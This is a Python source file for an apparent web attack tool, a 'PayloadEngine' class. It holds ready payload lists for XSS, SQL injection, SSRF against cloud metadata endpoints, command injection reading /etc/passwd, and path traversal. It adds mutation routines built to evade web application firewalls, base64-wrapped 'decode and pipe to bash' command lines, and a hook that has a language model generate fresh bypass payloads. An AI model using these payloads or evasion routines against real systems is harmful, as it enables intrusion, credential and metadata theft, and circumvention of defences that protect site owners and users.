import urllib.parse
import base64
import random
from typing import List, Dict, Any, Optional

class PayloadEngine:
    """
    Advanced Context-Aware Payload Generator
    Produces polymorphic payloads adapted to injection context and WAF bypassing.
    """
    def __init__(self, ai_engine=None):
        self.ai_engine = ai_engine
        
        # Hardcoded SecLists-style intelligent baseline
        self.payload_db = {
            "XSS": [
                # Standard
                "'\"><script>alert(1)</script>",
                # Polyglots
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "'\"><img src=x onerror=prompt(1)>",
                # WAF Evasion
                "<svg/onload=alert`1`>",
                "<svg onload=setInterval(alert,1)>",
                "javascript://%250Aalert(1)",
                "<iframe src=\"javascript:alert(1)\">",
                # Framework Specific
                "{{$on.constructor('alert(1)')()}}", 
                "${7*7}"
            ],
            "SQLI": [
                # Boolean Blind
                "' OR 1=1-- -",
                "' AND 1=1-- -",
                "' AND 1=2-- -",
                "1' OR '1'='1",
                # Time Based
                "'; WAITFOR DELAY '0:0:5'--",
                "1' AND SLEEP(5)--",
                "pg_sleep(5)--",
                # Error Based
                "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT VERSION()), 0x23, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
                "' ORDER BY 1--",
                "1 GROUP BY 1"
            ],
            "SSRF": [
                "http://127.0.0.1/",
                "http://localhost/",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::]:80/",
                "http://0.0.0.0/",
                "file:///etc/passwd",
                "dict://127.0.0.1:11211/stat"
            ],
            "CMDI": [
                "; cat /etc/passwd",
                "| id",
                "`whoami`",
                "$(curl -s http://169.254.169.254/latest/meta-data/)",
                "& type C:\Windows\win.ini",
                "| ping -c 10 127.0.0.1"
            ],
            "LFI": [
                "../../../../../../../../etc/passwd",
                "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                "/etc/passwd%00",
                "C:\\Windows\\win.ini"
            ]
        }

    def get_payloads(self, vuln_class: str, context: Optional[str] = None) -> List[str]:
        """
        Retrieves payloads targeted for a specific context (html, json, url_param).
        """
        base = self.payload_db.get(vuln_class, [])
        if not base:
            return []
            
        results = set(base)
        
        # Apply deterministic mutations based on Context
        if context == "json":
            for p in base:
                results.add(p.replace('"', '\\"')) # Escape quotes for JSON body
        elif context == "url_param":
            for p in base:
                results.add(urllib.parse.quote_plus(p))
        elif context == "html_attr":
            for p in base:
                # Evade attribute quoting
                results.add(f"\" {p} ")
                results.add(f"' {p} ")
                
        # Base64 variant injections
        if vuln_class in ["CMDI", "LFI"]:
            for p in base:
                b64 = base64.b64encode(p.encode()).decode()
                results.add(f"echo {b64} | base64 -d | bash")

        return list(results)

    async def mutate_for_waf_bypass(self, original_payload: str, evasion_strategy: str) -> List[str]:
        """
        Synthesizes novel payloads. Leverages AI Hook if available.
        """
        mutated = set([original_payload])
        
        # 1. Deterministic Bypass Rules
        if evasion_strategy == "SQL_OBFUSCATION":
            mutated.add(original_payload.replace(" ", "/**/"))
            mutated.add(original_payload.replace("SELECT", "SeLeCt").replace("UNION", "uNiOn"))
            mutated.add(original_payload.replace("OR", "||").replace("AND", "&&"))
        elif evasion_strategy == "XSS_OBFUSCATION":
            mutated.add(original_payload.replace("alert", "window['al'+'ert']"))
            mutated.add(original_payload.replace("<script>", "%3Cscript%3E"))
        elif evasion_strategy == "DOUBLE_ENCODE":
            mutated.add(urllib.parse.quote_plus(urllib.parse.quote_plus(original_payload)))

        # 2. LLM-Based Generation Hook
        if self.ai_engine:
            try:
                # Call ai.payload_gen.py
                llm_payloads = await self.ai_engine.generate(
                    vuln_class="GENERIC", 
                    context={"original": original_payload, "evasion": evasion_strategy}
                )
                for p in llm_payloads:
                    mutated.add(p)
            except Exception:
                pass # Fallback to deterministic
                
        return list(mutated)
